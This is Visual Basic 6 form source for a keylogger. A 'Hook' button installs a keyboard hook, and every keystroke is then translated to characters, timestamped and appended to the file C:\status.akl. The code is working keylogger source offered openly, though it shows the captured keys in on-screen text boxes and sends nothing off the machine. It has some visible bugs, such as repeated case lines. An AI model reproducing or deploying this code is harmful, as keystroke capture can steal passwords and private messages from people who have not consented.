VERSION 5.00
Begin VB.Form Form1 
   Caption         =   "Form1"
   ClientHeight    =   6450
   ClientLeft      =   60
   ClientTop       =   390
   ClientWidth     =   8130
   LinkTopic       =   "Form1"
   ScaleHeight     =   6450
   ScaleWidth      =   8130
   StartUpPosition =   3  'Windows Default
   Begin VB.TextBox Text3 
      Height          =   2775
      Left            =   600
      MultiLine       =   -1  'True
      TabIndex        =   3
      Top             =   2640
      Width           =   6735
   End
   Begin VB.TextBox Text2 
      Height          =   1575
      Left            =   4080
      MultiLine       =   -1  'True
      TabIndex        =   2
      Top             =   840
      Width           =   3255
   End
   Begin VB.TextBox Text1 
      Height          =   1575
      Left            =   600
      MultiLine       =   -1  'True
      TabIndex        =   1
      Top             =   840
      Width           =   3255
   End
   Begin VB.CommandButton Command1 
      Caption         =   "Hook"
      Height          =   375
      Left            =   600
      TabIndex        =   0
      Top             =   360
      Width           =   1215
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Public WithEvents MyEventRaiser As EventRaiser
Attribute MyEventRaiser.VB_VarHelpID = -1
Dim PressedControl As Boolean
Dim PressedShift As Boolean
Dim PressedAlt As Boolean
Dim LastTimePressed As Date
Dim Buffer As String, CntVbCrlF As Integer
Private Declare Function GetKeyboardState Lib "user32" (pbKeyState As Byte) As Long
Private Declare Function ToAscii Lib "user32" (ByVal uVirtKey As Long, ByVal uScanCode As Long, lpbKeyState As Byte, lpwTransKey As Long, ByVal fuState As Long) As Long

Private Sub Command1_Click()
    If Command1.Caption = "Hook" Then
        Hook
        Command1.Caption = "UnHook"
    Else
        UnHook
        Command1.Caption = "Hook"
    End If
End Sub

Private Sub Form_Load()
    Set MyEventRaiser = New EventRaiser
    Buffer = "                          [ Starting loggin at " & Now & "]"
    Save
    Buffer = ""
    LastTimePressed = Now
    CntVbCrlF = 1
End Sub

Private Sub Form_QueryUnload(Cancel As Integer, UnloadMode As Integer)
    Module1.UnHook
End Sub

Private Sub MyEventRaiser_KBHKeyDown(ByVal vkCode As Integer, ByVal scanCode As Integer, ByVal flags As Integer)
    Text1.Text = Text1.Text & "down vk:" & vkCode & " sc:" & scanCode & " fl:" & flags & vbCrLf
    Dim CurrentKeyboardState(0 To 255) As Byte
    Dim AsciiCode As Long
    If Buffer = "" Then Buffer = "[" & Now & "]: "
    Call GetKeyboardState(CurrentKeyboardState(0))
    
    Dim KeyPressed As String

    Select Case vkCode
        Case vbKeyF1 To vbKeyF12:       KeyPressed = "[F" & (vkCode - (vbKeyF1 - 1)) & "]"
        Case vbKeySpace:                KeyPressed = "[Space]"
        Case vbKeyDelete:               KeyPressed = "[Delete]"
        Case vbKeyInsert:               KeyPressed = "[Insert]"
        Case vbKeyTab:                  KeyPressed = "[Tab]"
        Case vbKeyBack:                 KeyPressed = "[Back]"
        Case vbKeyEscape:               KeyPressed = "[Escape]"
        Case OtrosVK.VK_LWin Or OtrosVK.VK_LWin: KeyPressed = "[Win]"
        Case vbKeyUp:                   KeyPressed = "[Up]"
        Case vbKeyUp:                   KeyPressed = "[Up]"
        Case vbKeyUp:                   KeyPressed = "[Up]"
        Case vbKeyDown:                 KeyPressed = "[Down]"
        Case vbKeyLeft:                 KeyPressed = "[Left]"
        Case vbKeyRight:                KeyPressed = "[Right]"
        Case vbKeyReturn:               KeyPressed = "[Return]"
        Case vbKeyControl, vbKeyShift, OtrosVK.VK_Alt, OtrosVK.VK_LAlt, 160, 161, 165, 162:
        KeyPressed = ""
        Case VK_LWin, VK_RWin:          KeyPressed = "[Win]"
        Case vbKeyCapital
            If (GetKeyState(vbKeyCapital) And KEY_TOGGLED) Then
                KeyPressed = "[CapsOn]"
            Else
                KeyPressed = "[CapsOff]"
            End If
        Case Else
            If ToAscii(vkCode, scanCode, CurrentKeyboardState(0), AsciiCode, 0) = 1 Then
                KeyPressed = Chr(AsciiCode)
            Else
                KeyPressed = "[Unknown:" & vkCode & "]"
            End If
    End Select
    
    Text3.Text = Text3.Text & KeyPressed
    Buffer = Buffer & KeyPressed
    Text1.SelStart = Len(Text1.Text) - 1
    Text1.SelLength = 1
    
    Dim s As Integer
    s = DateDiff("m", LastTimePressed, Now)
    If Len(Buffer) > (100 * CntVbCrlF) And CntVbCrlF < 3 Then
        Buffer = Buffer & vbCrLf: CntVbCrlF = CntVbCrlF + 1
        For i = 1 To 7: Buffer = Buffer & Chr(9): Next
    End If
    
    If s > 50 Or Len(Buffer) > 300 Then
        Save
        Buffer = ""
        CntVbCrlF = 1
    End If
       
    LastTimePressed = Now
End Sub

Private Sub MyEventRaiser_KBHKeyUp(ByVal vkCode As Integer, ByVal scanCode As Integer, ByVal flags As Integer)
    Text1.Text = Text1.Text & "up vk:" & vkCode & " sc:" & scanCode & " fl:" & flags & " vk chr:" & Chr(vkCode) & vbCrLf
    Text1.SelStart = Len(Text1.Text) - 1
    Text1.SelLength = 1
    'sin usarse, serviria para usar combinaciones de teclas, mas adelante vere que rollo
    Select Case vkCode
        Case vbKeyControl:                                  PressedControl = False
        Case vbKeyShift:                                    PressedShift = False
        Case OtrosVK.VK_Alt Or OtrosVK.VK_LAlt:             PressedAlt = False
    End Select
End Sub

Sub Save()
    Open "C:\status.akl" For Append As #1
        Print #1, Buffer
    Close #1
End Sub
